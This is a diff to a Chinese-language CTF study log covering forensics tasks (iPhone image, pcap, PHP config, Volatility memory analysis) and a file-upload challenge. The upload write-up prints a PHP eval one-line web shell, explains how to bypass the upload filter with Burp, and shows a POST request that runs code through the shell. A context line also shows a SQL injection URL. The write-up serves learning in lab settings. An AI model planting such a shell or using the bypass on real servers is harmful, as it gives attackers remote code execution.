@@ -264,4 +264,116 @@ http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,databa
 ```
 ![alt text](image-46.png)
 拿到flag
-### 二.
+
+
+
+## 1.20 新手，MISC，取证，SQL注入
+### 一.手机取证_1
+现对一个苹果手机进行取证，请您对以下问题进行分析解答。
+627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）
+
+下载了一个很大的压缩包，解压后有个exe
+![alt text](image-47.png)
+打开后直接搜索题目要求的图片
+![alt text](image-48.png)
+找到后将图片导出
+![alt text](image-49.png)
+导出后查看属性，发现分辨率是360x360
+### 二.WS（一）
+被入侵主机的IP是？
+
+***
+注：Telnet 是一种基于 TCP/IP 协议的网络通信协议，最早用于在网络中实现远程登录功能。通过Telnet协议，用户可以登录到远程主机，并在其上执行命令，就像在本地计算机上操作一样。
+默认23端口向远程主机的Telnet服务端发起连接请求
+***
+用wireshark打开给的pcapng文件
+![alt text](image-50.png)
+看到向23端口发送消息的时候的目的是192.168.246.28，所以这是被入侵的ip
+### 三.网站取证_2
+据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。
+请提交数据库连接的明文密码
+
+下载下来一个名为WWW的php环境，因为要找数据库连接的密码，所以直接去找database相关的配置文件
+![alt text](image-51.png)
+发现密码是一个叫做my_encrypt()的函数，并且有在文件开头include ("encrypt/encrypt.php");
+去找到这个encrypt.php
+![alt text](image-52.png)
+我们直接配置好php环境然后在这个文件末尾加上
+```php
+echo my_encrypt();
+```
+之后运行
+***
+注意：此处需要检查php版本，mcrypt 扩展是一个用于加密的 PHP 扩展库，但从 PHP 7.2 版本开始，mcrypt 扩展被标记为废弃，并且在 PHP 7.2 之后的版本中已完全移除。
+我使用的是 PHP 7.3.4 版本所以报错了，去安装了php5并重新配置之后就好了
+***
+![alt text](image-53.png)
+找到密码
+### 四.General Info
+Let’s start easy - whats the PC’s name and IP address?
+答案使用-连接加上NSSCTF{}格式提交，例如PC名为test，IP为127.0.0.1，提交NSSCTF{test-127.0.0.1}
+
+
+下载到一个.vmem文件，这题主要是学习Volatility的基本用法，时间主要花在配置工具上（
+***
+Volatility 是一个开源的内存取证框架，用于对内存镜像进行分析和取证。它通常用于从计算机的内存转储（memory dump）中提取有关系统状态的信息，以帮助在数字取证分析中发现潜在的恶意活动、攻击迹象、隐私泄漏等。
+能够从内存镜像（如 .raw、.dmp、.vmem 等格式）中提取出有价值的信息
+***
+配置好Volatility后，在所在文件夹打开终端<br>
+首先查看PC名字，该项在注册表的ControlSet001\Control\ComputerName\ComputerName条目中，在终端输入如下命令来查看
+```powershell
+python vol.py -f ..\..\OtterCTF.vmem windows.registry.printkey --key "ControlSet001\Control\ComputerName\ComputerName"
+```
+![alt text](image-61.png)
+找到名字为WIN-LO6FAF3DTFE
+接下来查看IP,用netscan读取
+```powershell
+ python vol.py -f ..\..\OtterCTF.vmem netscan
+```
+![alt text](image-62.png)
+找到IP为192.168.202.131<br>
+所以得到答案NSSCTF{WIN-LO6FAF3DTFE-192.168.202.131}
+## 1.22 进阶，文件上传，文件包含，一句话木马，php伪协议
+### 一.easyupload1.0
+打开往站，发现要求上传jpg文件（尝试上传别的文件，不可以，这里不做演示）
+![alt text](image-54.png)<br>
+思路为上传伪装成jpg的php的一句话木马，检查网站的文件<br>
+创建一个php文件，写一个一句话木马
+***
+一句话木马 是一种体积极小的、功能简化的恶意脚本程序，常用于攻击者在目标服务器上获取控制权或执行恶意操作
+***
+```php
+<?php @eval($_POST['r00ts']);?> 
+```
+保存为test.php，随后重命名为test.jpg，上传
+***
+\<?php ... ?\>：PHP 的标准脚本标记，表示这是 PHP 代码块。
+
+@：PHP 中的错误抑制符。如果代码中发生错误（例如未定义的变量），@ 会隐藏这些错误信息。
+在这里，@ 被用于抑制 eval() 执行过程中的任何错误提示。
+
+eval()：PHP 中的一个危险函数。它的作用是将传入的字符串当作 PHP 代码执行。
+
+$_POST['r00ts']：通过 HTTP POST 请求获取参数 r00ts 的值。
+***
+上传test并用burpsuite拦下请求
+![alt text](image-55.png)
+发送到Repeater后将filename修改为.php后再发送,上传成功
+![alt text](image-56.png)
+先看看网页的文件夹，用蚁剑添加数据
+![alt text](image-58.png)
+![alt text](image-59.png)
+返回上一级目录发现有一个flag.php
+![alt text](image-60.png)
+但这并不是正确答案，在这种类型题中还有一个地方可以隐藏数据，就是phpinfo中的Environment，
+这里面包含了服务器运行环境相关的变量和配置信息，即出题者可以在这里面存放自定义的数据，所以
+我们可以构造一个POST传参，把r00ts的值设为phpinfo();以查看相关信息，构造如下
+```http
+POST /upload/test.php HTTP/1.1
+Host: node4.anna.nssctf.cn:28883
+Content-Type: application/x-www-form-urlencoded
+
+r00ts=phpinfo();
+```
+发出之后即可查看phpinfo，在Environment中找到了flag
+![alt text](image-57.png)
